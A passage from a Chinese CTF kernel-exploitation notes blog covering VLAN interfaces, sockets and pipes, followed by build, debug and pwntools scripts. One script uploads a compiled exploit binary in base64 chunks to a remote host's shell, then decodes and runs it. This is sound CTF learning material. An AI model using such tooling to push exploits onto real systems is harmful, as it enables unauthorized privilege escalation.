<p><strong>虚拟VLAN网卡</strong>：这些虚拟VLAN网卡也不是实际上的网络接口设备，也可以作为网络接口在系统中出现，但是与子网卡不同的是，他们没有自己的配置文件。他们只是通过将物理网加入不同的VLAN而生成的VLAN虚拟网卡。如果将一个物理网卡通过vconfig命令添加到多个VLAN当中去的话，就会有多个VLAN虚拟网卡出现，他们的信息以及相关的VLAN信息都是保存在&#x2F;proc&#x2F;net&#x2F;vlan&#x2F;config这个临时文件中的，而没有独自的配置文件。它们的网络接口名是eth0.1、eth1.2这种名字。</p>
<p>注意：当需要启用VLAN虚拟网卡工作的时候，关联的物理网卡网络接口上必须没有IP地址的配置信息，并且，这些主物理网卡的子网卡也必须不能被启用和必须不能有IP地址配置信息。这个在网上看到的结论根据我的实际测试结果来看是不准确的，物理网卡本身可以绑定IP，并且给本征vlan提供通信网关的功能，但必须是在802.1q下。</p>
<h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><p><code>socket</code>就是插座 ( 中文翻译成<strong>套接字</strong>有点莫名其妙)，运行在计算机中的两个程序通过socket建立起一个通道，数据在通道中传输。 socket把复杂的TCP&#x2F;IP协议族隐藏了起来，对程序员来说只要用好socket相关的函数，就可以完成网络通信。</p>
<h1 id="管道-1"><a href="#管道-1" class="headerlink" title="管道"></a>管道</h1><p>​	管道的实质上就是一个文件系统，然后pipe指令会返回两个文件描述符，一个读一个写，而管道是单向的，就是在输入的时候不能输出，因此通常创建pipe两个管道一个用于输出，一个用于输入，管道分为管道本身（就是一个普通的类似流之类的），和管道数据（处于一个空间）。</p>
<p>​	在创建子进程的时候，管道本身会被复制，到那时管道数据确实共享的，这样就能实现数据的传输</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213696.png" alt="image-20240402232429087"></p>
<h1 id="远程脚本"><a href="#远程脚本" class="headerlink" title="远程脚本"></a>远程脚本</h1><p><strong>pack.sh</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"> </span><br><span class="line">gcc \</span><br><span class="line">    ./exp.c \</span><br><span class="line">    -o exp    \</span><br><span class="line">    -masm=intel \</span><br><span class="line">    --static  \</span><br><span class="line">    -g</span><br><span class="line"> </span><br><span class="line"><span class="built_in">chmod</span> 777 ./exp</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br><span class="line"><span class="built_in">chmod</span> 777 ./rootfs.cpio</span><br></pre></td></tr></table></figure>

<p><strong>gdbinit</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<h2 id="远程脚本-1"><a href="#远程脚本-1" class="headerlink" title="远程脚本"></a>远程脚本</h2><p>为了减小远程exp的体积，使用musl进行静态编译（）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;114.116.233.171&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;$ &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; bout&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x bout&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">os.system(<span class="string">&#x27;musl-gcc -w -s -static -o3 exp.c -o exp&#x27;</span>)</span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2024/04/28/kernel-note/">http://s1nec-1o.github.io/2024/04/28/kernel-note/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel/">kernel</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/" title="一些题目(format和ieee标准)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一些题目(format和ieee标准)</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/28/GO-Pwn/" title="GO-Pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GO-Pwn</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#kernel%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">kernel笔记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel"><span class="toc-number">2.1.</span> <span class="toc-text">Kernel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ring-Model"><span class="toc-number">2.2.</span> <span class="toc-text">Ring Model</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loadable-Kernel-Modules-LKMs"><span class="toc-number">2.3.</span> <span class="toc-text">Loadable Kernel Modules(LKMs)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="toc-number">2.3.1.</span> <span class="toc-text">相关指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall"><span class="toc-number">2.4.</span> <span class="toc-text">syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ioctl"><span class="toc-number">2.5.</span> <span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E5%88%87%E6%8D%A2"><span class="toc-number">2.6.</span> <span class="toc-text">状态切换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-space-to-kernel-space"><span class="toc-number">2.7.</span> <span class="toc-text">user space to kernel space</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-space-to-user-space"><span class="toc-number">2.7.1.</span> <span class="toc-text">kernel space to user space</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#struct-cred"><span class="toc-number">2.8.</span> <span class="toc-text">struct cred</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.</span> <span class="toc-text">内核态函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.10.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-kernel-pwn-%E7%9B%B8%E5%85%B3"><span class="toc-number">2.11.</span> <span class="toc-text">CTF kernel pwn 相关</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">3.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Change-Self"><span class="toc-number">3.2.</span> <span class="toc-text">Change Self</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%B9-cred"><span class="toc-number">3.3.</span> <span class="toc-text">直接改 cred</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%85%B7%E4%BD%93%E4%BD%8D%E7%BD%AE"><span class="toc-number">3.3.1.</span> <span class="toc-text">定位具体位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">定位</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.3.1.1.1.</span> <span class="toc-text">直接定位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.3.1.1.2.</span> <span class="toc-text">间接定位</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#task-struct"><span class="toc-number">3.3.1.1.2.1.</span> <span class="toc-text">task_struct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#comm"><span class="toc-number">3.3.1.1.2.2.</span> <span class="toc-text">comm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">修改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E5%AE%9A%E4%BD%8D-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">间接定位</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E5%B7%B2%E8%BF%87%E6%97%B6%EF%BC%89UAF-%E4%BD%BF%E7%94%A8%E5%90%8C%E6%A0%B7%E5%A0%86%E5%9D%97"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">（已过时）UAF 使用同样堆块</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.</span> <span class="toc-text">内核的文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dev%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">dev文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bin%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">bin文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">etc文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#home%E6%96%87%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">home文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#home%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.4.1.</span> <span class="toc-text">&#x2F;home目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#home%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.4.2.</span> <span class="toc-text">&#x2F;home目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">4.4.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lib%E6%96%87%E4%BB%B6"><span class="toc-number">4.5.</span> <span class="toc-text">lib文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lib%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.5.1.</span> <span class="toc-text">&#x2F;lib目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lib%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.5.2.</span> <span class="toc-text">&#x2F;lib目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lib%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E9%87%8D%E8%A6%81%E5%AD%90%E7%9B%AE%E5%BD%95"><span class="toc-number">4.5.3.</span> <span class="toc-text">&#x2F;lib目录下的重要子目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">4.5.4.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proc%E6%96%87%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">proc文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proc%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.6.1.</span> <span class="toc-text">&#x2F;proc目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.6.2.</span> <span class="toc-text">&#x2F;proc目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95"><span class="toc-number">4.6.3.</span> <span class="toc-text">&#x2F;proc目录下的一些重要文件和目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">4.6.4.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sbin%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.</span> <span class="toc-text">sbin文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sbin%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.7.1.</span> <span class="toc-text">&#x2F;sbin目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sbin%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.7.2.</span> <span class="toc-text">&#x2F;sbin目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">4.7.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys%E6%96%87%E4%BB%B6"><span class="toc-number">4.8.</span> <span class="toc-text">sys文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sys%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.8.1.</span> <span class="toc-text">&#x2F;sys目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.8.2.</span> <span class="toc-text">&#x2F;sys目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E5%AD%90%E7%9B%AE%E5%BD%95"><span class="toc-number">4.8.3.</span> <span class="toc-text">&#x2F;sys目录下的一些重要子目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">4.8.4.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmp%E6%96%87%E4%BB%B6"><span class="toc-number">4.9.</span> <span class="toc-text">tmp文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tmp%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.9.1.</span> <span class="toc-text">&#x2F;tmp目录的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tmp%E7%9B%AE%E5%BD%95%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.9.2.</span> <span class="toc-text">&#x2F;tmp目录的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">4.9.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="toc-number">5.</span> <span class="toc-text">进程的创建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86"><span class="toc-number">6.</span> <span class="toc-text">补充汇编知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E6%9F%90%E4%BA%9B%E4%BF%9D%E6%8A%A4"><span class="toc-number">7.</span> <span class="toc-text">补充某些保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E6%9F%90%E4%BA%9B%E5%86%85%E6%A0%B8%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">8.</span> <span class="toc-text">补充某些内核的知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GFP-KERNEL"><span class="toc-number">8.1.</span> <span class="toc-text">GFP_KERNEL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFP-HARDWALL"><span class="toc-number">8.2.</span> <span class="toc-text">__GFP_HARDWALL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFP-NOWARN"><span class="toc-number">8.3.</span> <span class="toc-text">__GFP_NOWARN</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%8C%87%E4%BB%A4"><span class="toc-number">9.</span> <span class="toc-text">一些指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96vmlinux%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">9.1.</span> <span class="toc-text">提取vmlinux的脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-number">10.</span> <span class="toc-text">管道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">10.0.1.</span> <span class="toc-text">管道的概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe%E5%87%BD%E6%95%B0"><span class="toc-number">10.0.2.</span> <span class="toc-text">pipe函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#seq-operation%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">11.</span> <span class="toc-text">seq_operation结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">11.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-seq%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">11.2.</span> <span class="toc-text">2.seq相关数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-seq%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">11.2.1.</span> <span class="toc-text">2.1 seq文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-seq%E6%93%8D%E4%BD%9C%E7%BB%93%E6%9E%84"><span class="toc-number">11.2.2.</span> <span class="toc-text">2.2 seq操作结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-seq%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">11.3.</span> <span class="toc-text">3.seq操作函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%94%A8seq%E6%B5%81%E5%A1%AB%E5%86%99-proc%E6%96%87%E4%BB%B6"><span class="toc-number">11.4.</span> <span class="toc-text">3.用seq流填写&#x2F;proc文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%88%9B%E7%AB%8B%E6%96%87%E4%BB%B6"><span class="toc-number">11.4.1.</span> <span class="toc-text">3.1 创立文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BB%93%E6%9E%84"><span class="toc-number">11.4.2.</span> <span class="toc-text">3.2 文件操作结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-open%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89"><span class="toc-number">11.4.3.</span> <span class="toc-text">3.3 open函数定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-seq%E6%93%8D%E4%BD%9C%E7%BB%93%E6%9E%84"><span class="toc-number">11.4.4.</span> <span class="toc-text">3.4 seq操作结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">11.5.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%83%85%E5%86%B5%EF%BC%9A%E7%B2%97%E7%95%A5%E4%BA%86%E8%A7%A3"><span class="toc-number">11.6.</span> <span class="toc-text">@###阅读情况：粗略了解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#modprobe-path%E8%A6%86%E5%86%99"><span class="toc-number">12.</span> <span class="toc-text">modprobe_path覆写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#modprobe-path%E4%BB%8B%E7%BB%8D"><span class="toc-number">12.1.</span> <span class="toc-text">modprobe_path介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%83%85%E5%86%B5%EF%BC%9A%E5%A4%A7%E8%87%B4%E4%BA%86%E8%A7%A3"><span class="toc-number">12.2.</span> <span class="toc-text">@###阅读情况：大致了解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4"><span class="toc-number">13.</span> <span class="toc-text">内核调试命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">13.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-ROP-%E5%9C%B0%E5%9D%80"><span class="toc-number">13.2.</span> <span class="toc-text">获取 ROP 地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPgadget"><span class="toc-number">13.2.1.</span> <span class="toc-text">ROPgadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropper"><span class="toc-number">13.2.2.</span> <span class="toc-text">ropper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">13.3.</span> <span class="toc-text">获取函数地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-multiarch-%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4"><span class="toc-number">14.</span> <span class="toc-text">gdb-multiarch 调试命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%9E%B6%E6%9E%84"><span class="toc-number">14.1.</span> <span class="toc-text">设置架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3"><span class="toc-number">14.2.</span> <span class="toc-text">连接端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 